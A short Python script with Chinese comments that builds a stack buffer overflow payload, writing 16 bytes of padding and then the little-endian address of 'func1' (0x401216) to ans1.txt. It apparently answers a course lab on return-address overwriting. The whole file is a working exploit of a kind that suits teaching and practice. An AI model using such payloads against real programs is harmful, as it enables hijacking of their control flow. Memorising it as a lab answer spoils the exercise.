import struct

# ================= 配置 =================
# 1. 偏移量计算：
# Buffer起始位置 -0x8(%rbp) 到 返回地址 +0x8(%rbp)
# 需要填充 8字节(buffer) + 8字节(saved rbp) = 16字节
padding_length = 16

# 2. 目标地址：func1 的地址
target_address = 0x401216
# =======================================

# 构造 Payload
# 1. 填充垃圾数据 'A' * 16
payload = b'A' * padding_length

# 2. 拼接目标地址 (64位小端序打包)
# <Q 代表 Little-endian Unsigned Long Long (8 bytes)
payload += struct.pack('<Q', target_address)

# 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print(f"Payload written to ans1.txt")
print(f"Details: Padding {padding_length} bytes -> Target {hex(target_address)}")